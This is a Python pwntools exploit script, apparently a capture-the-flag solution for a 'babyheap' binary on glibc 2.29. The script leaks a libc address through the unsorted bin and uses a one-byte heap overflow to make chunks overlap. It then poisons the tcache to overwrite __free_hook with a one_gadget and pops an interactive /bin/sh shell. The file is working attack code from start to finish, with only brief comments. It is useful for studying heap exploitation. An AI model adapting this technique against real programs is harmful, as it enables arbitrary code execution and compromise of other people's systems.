#!/usr/bin/env python3

from pwn import *

e = ELF("./babyheap")
libc = ELF("./libc.so")
ld = ELF("./ld-2.29.so")

context.binary = e
#context.gdbinit = '/path/to/pwndbg/gdbinit.py'
#context.log_level = 'debug'

def malloc(size, content):
    r.sendlineafter(b'Command:', b'M')
    r.sendlineafter(b'Size:', bytes(str(size), 'utf-8'))
    r.sendlineafter(b'Content:', content)

def free(index):
    r.sendlineafter(b'Command:', b'F')
    r.sendlineafter(b'(Starting from 0) Index:', bytes(str(index), 'utf-8'))


r = process([e.path])

SMALL_SIZE = 248
LARGE_SIZE = 376

malloc(SMALL_SIZE, b'A'*SMALL_SIZE)  # will go to unsortedbin
malloc(SMALL_SIZE, b'B'*SMALL_SIZE)

for i in range(7):
    malloc(SMALL_SIZE, bytes(str(i)*SMALL_SIZE, 'utf-8'))

# fill up tcache (max 7 free chunks per bin)
for i in range(2, 9): # 2 - 8 indexes ()
    print(i)
    free(i)

# the 0th index will now be freed to unsorted bin
free(0)

# now they will be coalesced to form a larger chunk of size 0x200
free(1)

# empty the tcachebin 
for i in range(7):
    malloc(SMALL_SIZE, b'A'*i)

# now index 7 will be a splitted chunk from the unsortedbin - LIBC LEAK HERE
LEAK_DELIM = b'C'*8
malloc(SMALL_SIZE, LEAK_DELIM)
r.sendlineafter(b'>', b'S')
r.sendlineafter(b'Index:', b'7')
r.recvuntil(LEAK_DELIM)

leak = u64(r.recvline().strip().ljust(8, b'\x00'))  # leak of main_arena+592
libc.address = libc_base = leak - (libc.sym['main_arena'] + 592)

malloc(SMALL_SIZE, b'H'*248 + b'\x81')  # overflow to the next chunk's size field and overwrite the last byte with 0x81
free(6)  # free the forged size chunk

free(5)  # free chunk 5

CHUNK_5_SIZE = b'A'*8
NEXT_TCACHE_CHUNK_ADDR = p64(libc.sym['__free_hook']).strip(b'\x00')  # we cannot send nul bytes!
#print(hex(libc.sym['__free_hook']))
malloc(LARGE_SIZE, b'E'*248 + CHUNK_5_SIZE + NEXT_TCACHE_CHUNK_ADDR)  # this chunk now overlaps to chunk 5 - TCAHCE HAS BEEN POISONED! :D

malloc(SMALL_SIZE, b'')  # get the next chunk - doesnt matter for us

'''
0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL || rcx is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
'''
one_gadget = p64(libc_base + 0xe2383).strip(b'\x00')
malloc(SMALL_SIZE, one_gadget)  # write to the hook

free(0)   # doesn't matter, we just want to call free() to trigger the hook (i mean - the one gadget :D)

r.interactive()

   



